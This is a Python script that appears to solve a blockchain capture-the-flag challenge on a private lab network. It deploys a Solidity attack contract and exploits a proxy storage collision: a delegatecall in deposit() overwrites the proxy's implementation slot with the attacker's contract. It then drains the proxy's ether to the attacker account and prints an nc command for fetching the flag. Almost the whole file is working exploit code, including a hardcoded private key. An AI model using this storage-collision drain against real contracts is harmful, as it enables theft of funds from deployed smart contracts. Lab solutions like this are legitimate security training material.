#!/usr/bin/env python3

# add import
import sys
from web3 import Web3
from solcx import compile_source
from solcx import get_installed_solc_versions
from solcx import install_solc
from solcx import set_solc_version

# add definition
Local_Ethereum_Endpoint = 'http://10.83.2.136:8545/9ef41611-e2d3-44ca-a9c9-1d7d3b834cb8'
Private_Key = '0x944b2fce628a5f915e230fb2e90022dbecaf15b2997fef4b06eb78776dcca408'
Setup_Address = '0x82692eacF3202eF01bCd8a236bB62B652E60972b'
Solidity_Version = '0.8.20'

# connect ethereum
w3 = Web3(Web3.HTTPProvider(Local_Ethereum_Endpoint, request_kwargs={'timeout': 30}))

# attack contract
Attack_Source = '''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Attack {
    function drain(address payable recipient) external {
        uint256 amount = address(this).balance;
        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Drain failed");
    }
}
'''

# setup ABI
Setup_ABI = [
    {
        'type': 'function',
        'name': 'TARGET',
        'inputs': [],
        'outputs': [{'type': 'address'}],
        'stateMutability': 'view'
    },
    {
        'type': 'function',
        'name': 'isSolved',
        'inputs': [],
        'outputs': [{'type': 'bool'}],
        'stateMutability': 'view'
    }
]

# proxy ABI
Proxy_ABI = [
    {
        'type': 'function',
        'name': 'implementation',
        'inputs': [],
        'outputs': [{'type': 'address'}],
        'stateMutability': 'view'
    },
    {
        'type': 'function',
        'name': 'deposit',
        'inputs': [{'name': 'referrer', 'type': 'address'}],
        'outputs': [],
        'stateMutability': 'payable'
    }
]

# compile solidity contract
def compile_attack():
    versions = get_installed_solc_versions()
    found = False
    for version in versions:
        if str(version) == Solidity_Version:
            found = True

    if found == False:
        print('Installing solc', Solidity_Version)
        install_solc(Solidity_Version)

    set_solc_version(Solidity_Version)
    result = compile_source(Attack_Source, output_values=['abi', 'bin'], solc_version=Solidity_Version)
    contract_data = result['<stdin>:Attack']
    return contract_data['abi'], contract_data['bin']


# send signed transaction
def send_transaction(transaction, account, description):
    # build_transaction can add EIP-1559 values
    # use gasPrice only for legacy transaction
    if 'maxFeePerGas' in transaction:
        del transaction['maxFeePerGas']
    if 'maxPriorityFeePerGas' in transaction:
        del transaction['maxPriorityFeePerGas']
    if 'type' in transaction:
        del transaction['type']
    if 'accessList' in transaction:
        del transaction['accessList']

    transaction['from'] = account.address
    transaction['chainId'] = w3.eth.chain_id
    transaction['nonce'] = w3.eth.get_transaction_count(account.address, 'pending')
    transaction['gasPrice'] = w3.eth.gas_price

    if 'gas' not in transaction:
        transaction['gas'] = 500000

    signed = account.sign_transaction(transaction)
    raw_transaction = signed.raw_transaction
    tx_hash = w3.eth.send_raw_transaction(raw_transaction)
    print(description, 'TX:', tx_hash.hex())

    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    if receipt.status != 1:
        raise Exception(description + ' failed')

    print(description, 'success, gas used:', receipt.gasUsed)
    return receipt


def main():
    if w3.is_connected() == False:
        print('RPC connection failed')
        return

    account = w3.eth.account.from_key(Private_Key)
    attacker_address = account.address
    print('Chain ID:', w3.eth.chain_id)
    print('Attacker:', attacker_address)

    # get setup contract
    setup = w3.eth.contract(address=Web3.to_checksum_address(Setup_Address), abi=Setup_ABI)
    target_address = setup.functions.TARGET().call()
    target = w3.eth.contract(address=target_address, abi=Proxy_ABI)

    print('Target:', target_address)
    print('Initial balance:', w3.from_wei(w3.eth.get_balance(target_address), 'ether'), 'ETH')

    if setup.functions.isSolved().call() == True:
        print('Already solved')
        return

    old_implementation = target.functions.implementation().call()
    print('Original implementation:', old_implementation)

    # step 1 compile attack contract
    print('[1/4] Compile attack contract')
    attack_abi, attack_bytecode = compile_attack()
    attack_factory = w3.eth.contract(abi=attack_abi, bytecode=attack_bytecode)

    # step 2 deploy attack contract
    print('[2/4] Deploy attack contract')
    deploy_tx = attack_factory.constructor().build_transaction({
        'from': attacker_address,
        'gas': 1500000
    })
    deploy_receipt = send_transaction(deploy_tx, account, 'Deploy Attack')
    attack_address = deploy_receipt.contractAddress
    if attack_address is None:
        raise Exception('Deployment failed')
    print('Attack address:', attack_address)

    # step 3 storage collision
    # Proxy slot 0 = implementation
    # Chal slot 0 = latestReferrer
    # deposit() uses delegatecall and changes slot 0
    print('[3/4] Change implementation')
    deposit_tx = target.functions.deposit(attack_address).build_transaction({
        'from': attacker_address,
        'value': 0,
        'gas': 300000
    })
    send_transaction(deposit_tx, account, 'Storage Collision')

    new_implementation = target.functions.implementation().call()
    print('New implementation:', new_implementation)
    if new_implementation.lower() != attack_address.lower():
        raise Exception('Implementation overwrite failed')

    # step 4 call drain through proxy
    print('[4/4] Drain proxy')
    attack_proxy = w3.eth.contract(address=target_address, abi=attack_abi)
    print('Proxy balance:', w3.from_wei(w3.eth.get_balance(target_address), 'ether'), 'ETH')

    drain_tx = attack_proxy.functions.drain(attacker_address).build_transaction({
        'from': attacker_address,
        'gas': 300000
    })
    send_transaction(drain_tx, account, 'Drain')

    # check result
    remaining_balance = w3.eth.get_balance(target_address)
    solved = setup.functions.isSolved().call()
    print('Remaining balance:', remaining_balance, 'wei')
    print('isSolved():', solved)

    if solved == True:
        print('CHALLENGE SOLVED')
        print('Get flag: nc 10.83.2.136 31337')
        print('Select option 3')
    else:
        print('Challenge not solved')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('Interrupted')
        sys.exit(130)
    except Exception as error:
        print('Error:', error)
        sys.exit(1)
